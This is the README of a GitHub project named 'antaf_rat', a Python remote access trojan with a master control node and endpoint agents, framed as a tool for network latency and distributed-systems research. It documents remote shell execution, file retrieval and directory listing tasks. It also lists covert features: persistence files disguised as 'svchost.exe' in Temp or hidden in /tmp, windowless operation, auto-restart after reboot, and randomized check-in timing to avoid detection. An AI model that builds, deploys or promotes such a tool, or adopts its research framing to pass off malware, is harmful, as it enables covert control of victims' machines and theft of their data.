# antaf_rat
A comprehensive, security-focused framework for distributed systems research and network latency analysis. Designed for academic research and ethical network administration studies.
# ANTAF - Asynchronous Network Task & Analytics Framework

A comprehensive, security-focused framework for distributed systems research and network latency analysis. Designed for academic research and ethical network administration studies.

## 📋 Overview

ANTAF (Asynchronous Network Task & Analytics Framework) is a Python-based distributed system that enables researchers to study command execution in low-bandwidth, high-latency environments. The framework consists of a central Master Control Node and multiple Endpoint Agents that communicate securely over encrypted channels.

## ⚠️ Important Notice

**This framework is designed for academic research and ethical security testing only.** Do not use this software on systems you do not own or without proper authorization. The authors are not responsible for any misuse of this software.

## 🏗️ Architecture

ANTAF/
├── Master Control Node (master_node.py)
├── Endpoint Agents (agent.py)
├── Configuration (config.py)
├── Cryptography Utilities (utils/crypto.py)
├── Secure Logging (utils/logger.py)
├── Keys and Certificates (keys/)
└── Log Files (logs/)


## 🛡️ Security Features

### Advanced Security Implementation
- **RSA Key Exchange**: Secure AES key distribution between master and agents
- **AES-256-CBC Encryption**: All communication encrypted with 256-bit keys
- **HMAC Authentication**: Message integrity verification to prevent tampering
- **SSL/TLS Transport Security**: Encrypted communication channels
- **Agent Fingerprinting**: Unique identification based on system characteristics
- **Session Token Management**: Secure session handling with token rotation
- **Encrypted Log Files**: All logs encrypted at rest using Fernet encryption
- **Certificate-Based Authentication**: PKI-based secure connections
- **Anti-Replay Protection**: Timestamp verification to prevent replay attacks
- **Resource Limiting**: File size limits and command timeouts for safety
- **Stealth Persistence**: Hidden file placement and system integration

## 🚀 Quick Start

### Prerequisites
# Install required dependencies
pip install pycryptodome cryptography

# OpenSSL for certificate generation (usually pre-installed)


### Setup

1. **Clone the repository:**
git clone https://github.com/quevedoSteven/antaf_rat
    
cd antaf

2. **Run the Master Node:**
python master_node.py

3. **Run the Endpoint Agent:**
python agent.py

## 🎮 Usage

### Master Node Commands
ANTAF> list_agents --> Show all connected agents

ANTAF> select_agent <session_id> --> Select an agent for commands

ANTAF> send_task <json_task> --> Send a task to selected agent

ANTAF> exit --> Exit the framework

### Example Tasks
# List directory contents
send_task {"task_id": "list_dir", "path": "/home"}

# Read a file
send_task {"task_id": "get_file", "filepath": "/etc/hosts"}

# Execute shell command
send_task {"task_id": "run_shell", "command": "whoami"}

## 📁 Project Structure

antaf/
│
├── agent.py --> Endpoint Agent implementation
├── master_node.py --> Master Control Node implementation
├── config.py --> Configuration settings
├── README.md --> This file
│
├── utils/
│   ├── crypto.py --> Cryptographic utilities and secure channel management
│   └── logger.py --> Secure logging implementation
│
├── keys/ --> Cryptographic keys and certificates
│   ├── master_private.pem --> Master node private key
│   ├── master_public.pem --> Master node public key
│   └── agent_fingerprints.json --> Authorized agent fingerprints
│
├── logs/ --> Encrypted log files
│   └── antaf.log --> Main log file
│
└── requirements.txt --> Python dependencies

## 🔧 Configuration

### config.py Settings
# Network Configuration
MASTER_IP = "127.0.0.1" --> Master node IP address
MASTER_PORT = 9999 --> Master node port
CERT_FILE = "keys/master_cert.pem" --> SSL certificate
KEY_FILE = "keys/master_key.pem" --> SSL private key

# Persistence Paths
PERSISTENCE_PATH_WIN = "~/AppData/Local/Temp/svchost.exe"
PERSISTENCE_PATH_LINUX = "/tmp/.svchost"

# Logging Configuration
LOG_FILE = "logs/antaf.log"
MAX_LOG_SIZE = 10 * 1024 * 1024 --> 10MB log rotation
LOG_BACKUP_COUNT = 5 --> Number of backup logs

# Security Settings
SESSION_TIMEOUT = 3600 --> Session timeout in seconds
TOKEN_LENGTH = 32 --> Session token length
FINGERPRINT_FILE = "keys/agent_fingerprints.json"

## 🛠️ Task Types

### Supported Tasks
1. **`list_dir`**: List directory contents
   {"task_id": "list_dir", "path": "/target/directory"}

2. **`get_file`**: Read file contents (binary files hex-encoded)
   {"task_id": "get_file", "filepath": "/path/to/file"}

3. **`run_shell`**: Execute shell commands
   {"task_id": "run_shell", "command": "ls -la"}

## 📊 Logging

All activities are logged to encrypted files in the `logs/` directory:
- **Encrypted at rest** using Fernet symmetric encryption
- **Rotating logs** to prevent disk space issues
- **Detailed security events** including authentication, task execution, and errors

## 🔒 Security Best Practices

### For Production Use:
1. **Proper Certificate Management**: Replace self-signed certificates with CA-signed ones
2. **Secure Key Storage**: Store private keys in secure hardware or encrypted storage
3. **Network Segmentation**: Run in isolated network environments
4. **Access Controls**: Implement proper user authentication and authorization
5. **Regular Updates**: Keep cryptographic libraries updated
6. **Monitoring**: Implement real-time monitoring of agent activities

### Agent Security Features:
- **Stealth Operation**: Runs without visible console windows
- **Persistence Mechanisms**: Automatically restarts after system reboot
- **Randomized Connection Intervals**: Avoids detection through timing analysis
- **Resource Limiting**: Prevents system resource exhaustion
- **Command Timeouts**: Prevents hanging processes

## 🧪 Research Applications

### Network Latency Studies
- Measure command execution times across different network conditions
- Analyze performance degradation in high-latency environments
- Study bandwidth utilization patterns

### Distributed Systems Research
- Test fault tolerance and recovery mechanisms
- Analyze consensus protocols in adverse conditions
- Study security implications of distributed command execution

### Remote Administration
- Secure remote system management
- Network monitoring and diagnostics
- Automated system maintenance tasks

## 📚 Dependencies

pycryptodome>=3.15.0
cryptography>=38.0.0

Install with:
pip install -r requirements.txt

## ⚖️ License

This project is designed for academic research purposes only. See LICENSE file for details.

## 📞 Support

For academic inquiries and research collaboration, please contact the development team.

## 🙏 Acknowledgments

This framework was developed for distributed systems and network security research. Special thanks to the cybersecurity research community for their contributions to the field.

---

**Remember**: This software should only be used in controlled environments for legitimate research purposes. Always obtain proper authorization before testing on any network or system.
